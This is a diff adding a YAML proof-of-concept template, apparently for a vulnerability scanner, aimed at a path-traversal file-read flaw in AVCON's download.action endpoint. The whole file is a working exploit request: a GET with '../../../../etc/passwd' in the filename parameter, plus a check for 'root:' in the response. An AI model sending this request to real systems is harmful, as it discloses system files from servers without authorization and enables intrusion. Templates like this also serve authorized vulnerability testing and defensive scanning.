@@ -1,0 +1,18 @@
+name: poc-yaml-AVCON-download.action-File-reading
+transport: http
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /download.action?filename=../../../../../../../../etc/passwd
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
+    expression: response.status == 200 && response.body.bcontains(b'root:')
+
+expression: r0()
+
+detail:
+  author: Superhero
+  links:
+    - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247486711&idx=1&sn=34e4c799279bf0673136bff2221ac65b&chksm=c267b9c4f51030d2a297bca65a7faec2cd8e4fe7bc6d009852fcadb8f41219672e21a300d9fa&token=522460222&lang=zh_CN#rd
